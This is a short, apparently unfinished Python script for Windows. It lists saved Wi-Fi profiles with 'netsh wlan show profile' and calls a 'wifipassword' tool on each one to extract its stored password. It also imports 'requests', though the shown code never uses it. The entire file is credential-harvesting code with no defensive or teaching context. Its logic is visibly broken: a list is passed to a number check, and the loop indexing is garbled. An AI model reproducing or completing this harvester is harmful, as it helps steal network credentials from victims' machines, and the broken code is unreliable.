import subprocess
import wifipasswords
import requests

def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        return False
name = subprocess.getoutput("netsh wlan show profile").replace("Profiles on interface Wi-Fi:", '').replace("Group policy profiles (read only)", '').replace("-", '').replace("<None>", '').replace("User profiles", '').replace("All User Profile", '').replace(":", '').replace("          ", '')
name2 = name.split()
name3 = is_number(name2)
for i in name2:
    if name3 == True:
        n = name2.index(i)
        combined_value = name2[n] + name2[n - 1]
        a = subprocess.getoutput("wifipassword "+i )
